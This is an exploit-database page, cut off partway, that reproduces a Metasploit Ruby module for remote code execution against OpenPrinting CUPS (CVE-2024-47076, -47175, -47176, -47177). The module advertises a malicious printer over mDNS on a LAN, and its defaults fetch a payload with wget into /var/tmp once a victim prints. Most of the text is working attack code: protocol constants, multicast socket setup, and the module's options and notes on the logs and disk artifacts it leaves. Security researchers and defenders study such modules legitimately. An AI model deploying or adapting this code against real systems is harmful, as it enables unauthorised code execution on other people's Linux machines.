---
title: CUPS IPP Attributes LAN Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2024110051
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-12-01
fetch_date: 2025-10-06T19:33:43.321273
---

# CUPS IPP Attributes LAN Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **CUPS IPP Attributes LAN Remote Code Execution** **2024.11.30**  Credit:  **[Spencer McIntyre](https://cxsecurity.com/author/Spencer%2BMcIntyre/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

class MetasploitModule < Msf::Exploit::Remote
Rank = NormalRanking
include Exploit::Remote::DNS::Common
include Exploit::Remote::SocketServer
include Msf::Exploit::Remote::HttpServer::HTML
# Accessor for IPP HTTP service
attr\_accessor :service2
MULTICAST\_ADDR = '224.0.0.251'
# Define IPP constants
module TagEnum
UNSUPPORTED\_VALUE = 0x10
UNKNOWN\_VALUE = 0x12
NO\_VALUE = 0x13
# Integer types
INTEGER = 0x21
BOOLEAN = 0x22
ENUM = 0x23
# String types
OCTET\_STR = 0x30
DATETIME\_STR = 0x31
RESOLUTION = 0x32
RANGE\_OF\_INTEGER = 0x33
TEXT\_WITH\_LANGUAGE = 0x35
NAME\_WITH\_LANGUAGE = 0x36
TEXT\_WITHOUT\_LANGUAGE = 0x41
NAME\_WITHOUT\_LANGUAGE = 0x42
KEYWORD = 0x44
URI = 0x45
URI\_SCHEME = 0x46
CHARSET = 0x47
NATURAL\_LANGUAGE = 0x48
MIME\_MEDIA\_TYPE = 0x49
end
# Define IPP printer operations
module OperationEnum
# https://tools.ietf.org/html/rfc2911#section-4.4.15
PRINT\_JOB = 0x0002
VALIDATE\_JOB = 0x0004
CANCEL\_JOB = 0x0008
GET\_JOB\_ATTRIBUTES = 0x0009
GET\_JOBS = 0x000a
GET\_PRINTER\_ATTRIBUTES = 0x000b
# 0x4000 - 0xFFFF is for extensions
# CUPS extensions listed here:
# https://web.archive.org/web/20061024184939/http://uw714doc.sco.com/en/cups/ipp.html
CUPS\_GET\_DEFAULT = 0x4001
CUPS\_LIST\_ALL\_PRINTERS = 0x4002
end
module JobStateEnum
# https://tools.ietf.org/html/rfc2911#section-4.3.7
PENDING = 3 # AKA "IDLE"
PENDING\_HELD = 4
PROCESSING = 5
PROCESSING\_STOPPED = 6
CANCELED = 7
ABORTED = 8
COMPLETED = 9
end
# Define IPP section constants
module SectionEnum
SECTIONS = 0x00
SECTIONS\_MASK = 0xf0
OPERATION = 0x01
JOB = 0x02
ENDTAG = 0x03 # Changed from END
PRINTER = 0x04
UNSUPPORTED = 0x05
end
class MulticastComm < Rex::Socket::Comm::Local
# hax by spencer to set the socket options for handling multicast using the native APIs (as opposed to Rex::Socket)
# without this in place, the module won't work on a system with multiple network interfaces
def self.create\_by\_type(param, type, proto = 0)
socket = super
socket.setsockopt(::Socket::SOL\_SOCKET, ::Socket::SO\_REUSEADDR, 1)
socket.setsockopt(::Socket::IPPROTO\_IP, ::Socket::IP\_MULTICAST\_TTL, 255)
membership = IPAddr.new(MULTICAST\_ADDR).hton + IPAddr.new('0.0.0.0').hton
socket.setsockopt(::Socket::IPPROTO\_IP, ::Socket::IP\_ADD\_MEMBERSHIP, membership)
socket
end
end
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'CUPS IPP Attributes LAN Remote Code Execution',
'Description' => %q{
This module exploits vulnerabilities in OpenPrinting CUPS, which is running by
default on most Linux distributions. The vulnerabilities allow an attacker on
the LAN to advertise a malicious printer that triggers remote code execution
when a victim sends a print job to the malicious printer. Successful exploitation
requires user interaction, but no CUPS services need to be reachable via accessible
ports. Code execution occurs in the context of the lp user. Affected versions
are cups-browsed <= 2.0.1, libcupsfilters <= 2.1b1, libppd <= 2.1b1, and
cups-filters <= 2.0.1.
},
'Author' => [
# Original researcher
'Simone Margaritelli',
# Public exploit
'Rick de Jager',
# IPP server implementation based on Python's ipp-server
'David Batley',
# mDNS functionality
'Spencer McIntyre',
'RageLtMan <rageltman[at]sempervictus>',
# Metasploit module
'Ryan Emmons'
],
'License' => MSF\_LICENSE,
'References' => [
# The relevant CUPS CVE identifiers
['CVE', '2024-47076'],
['CVE', '2024-47175'],
['CVE', '2024-47177'],
['CVE', '2024-47176'],
# The initial researcher publication
['URL', 'https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/'],
# The public exploit this module was inspired by
['URL', 'https://github.com/RickdeJager/cupshax'],
# The cups-browsed GitHub security advisory
['URL', 'https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8'],
# The libcupsfilters GitHub security advisory
['URL', 'https://github.com/OpenPrinting/libcupsfilters/security/advisories/GHSA-w63j-6g73-wmg5'],
# The libppd GitHub security advisory
['URL', 'https://github.com/OpenPrinting/libppd/security/advisories/GHSA-7xfx-47qg-grp6'],
# The cups-filters GitHub security advisory
['URL', 'https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-p9rh-jxmq-gq47'],
# The IPP server implementation this module is based on
['URL', 'https://github.com/h2g2bob/ipp-server/']
],
# Executes as 'lp' on most Linux distributions
'Privileged' => false,
'Targets' => [['Default', {}]],
'Platform' => %w[linux unix],
'Arch' => [ARCH\_CMD],
'DefaultOptions' => {
'FETCH\_COMMAND' => 'WGET',
'FETCH\_WRITABLE\_DIR' => '/var/tmp'
},
'Stance' => Msf::Exploit::Stance::Passive,
'DefaultAction' => 'Service',
'DefaultTarget' => 0,
'DisclosureDate' => '2024-09-26',
'Notes' => {
# There's a small chance the fake printer may flag as "broken" after one execution
# If this happens, other victims on the LAN will still be susceptible to code execution
# However, this \*shouldn't\* happen :)
'Stability' => [CRASH\_SAFE],
# Requires a user to send a print job to the malicious printer to trigger RCE
'Reliability' => [EVENT\_DEPENDENT],
'SideEffects' => [
# /var/log/cups/error\_log will likely contain the payload, IPP server details, and printer name
# /var/log/cups/access\_log will contain the IPP server details and printer name
IOC\_IN\_LOGS,
# The /tmp directory will likely contain a file called "foomatic-" + five random characters
# This file is a PDF owned by 'lp', and it's the content that the victim user tried to print
ARTIFACTS\_ON\_DISK
]
}
)
)
register\_options(
[
OptString.new('PrinterName', [true, 'The printer name', 'PrintToPDF'], regex: /^[a-zA-Z0-9\_ ]+$/),
OptAddress.new('SRVHOST', [true, 'The local host to listen on (cannot be 0.0.0.0)']),
OptPort.new('SRVPORT', [true, 'The local port for the IPP service', 7575])
]
)
end
def validate
super
if Rex::Socket.is\_ip\_addr?(datastore['SRVHOST']) && Rex::...